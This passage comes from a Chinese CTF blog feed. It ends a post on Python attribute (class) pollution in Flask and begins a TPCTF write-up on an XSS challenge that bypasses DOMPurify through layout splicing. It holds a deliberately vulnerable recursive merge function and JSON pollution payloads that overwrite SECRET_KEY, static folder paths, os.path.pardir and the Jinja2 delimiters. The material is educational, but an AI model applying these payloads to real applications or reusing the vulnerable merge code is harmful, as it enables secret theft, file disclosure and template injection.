class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[+]Config:%s&quot;</span>%(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>污染链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;app&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;config&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;SECRET_KEY&quot;</span> :<span class="hljs-string">&quot;hacker&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="got-first-request污染"><a href="#got-first-request污染" class="headerlink" title="_got_first_request污染"></a>_got_first_request污染</h4><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br>flag = <span class="hljs-string">&quot;Is flag here?&quot;</span><br><br><span class="hljs-meta">@app.before_first_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">&quot;special&quot;</span>) <span class="hljs-keyword">and</span> app.special == <span class="hljs-string">&quot;U_Polluted_It&quot;</span>:<br>        flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-built_in">setattr</span>(app, <span class="hljs-string">&quot;special&quot;</span>, <span class="hljs-string">&quot;U_Polluted_It&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>链子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_got_first_request&quot;</span>:<span class="hljs-literal">False</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="static-url-path污染"><a href="#static-url-path污染" class="headerlink" title="_static_url_path污染"></a>_static_url_path污染</h4><p>这个属性用于定义静态文件的目录，默认情况下，Flask 会从 <code>static</code> 文件夹中提供静态文件。所以我们只要污染这个属性就可以进行目录穿越</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag in ./flag but heres only static/index.html&quot;</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;./&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a>os.path.pardir</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag in ./flag but heres only static/index.html&quot;</span><br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里是利用特性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;os&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;path&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;pardir&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="SSTI-jinja2污染"><a href="#SSTI-jinja2污染" class="headerlink" title="SSTI jinja2污染"></a>SSTI jinja2污染</h4><p>这里就只贴出恶意链，不具体分析了，其实就是走的ssti的底层，去改掉模板的标识符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;jinja_env&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;variable_start_string&quot;</span>:<span class="hljs-string">&quot;[[&quot;</span>,<br>                    <span class="hljs-string">&quot;variable_end_string&quot;</span>:<span class="hljs-string">&quot;]]&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="属性污染以及寻找-pydash"><a href="#属性污染以及寻找-pydash" class="headerlink" title="属性污染以及寻找(pydash)"></a>属性污染以及寻找(pydash)</h2><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>感谢p神，baozengwi师傅</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原型链污染</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPCTF复现</title>
    <link href="/tuyi/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/tuyi/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web小白斗胆挑战国内ctf天花板，拼尽全力无法战胜 😭😭😭</p><p>但还是分享下思路吧</p><p>tips:可以使用<a href="https://yeswehack.github.io/Dom-Explorer/">Dom-Explorer</a>查看 DOMPurify 输出</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="bady-logout"><a href="#bady-logout" class="headerlink" title="bady_logout"></a>bady_logout</h2><p>xss怎么还要绕<code>dompurify</code>版本是不是太高了😁，思路错了，他采用拼接的方法，我们可以拼接xss</p><p>源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content&#125;&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>我们主要看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span 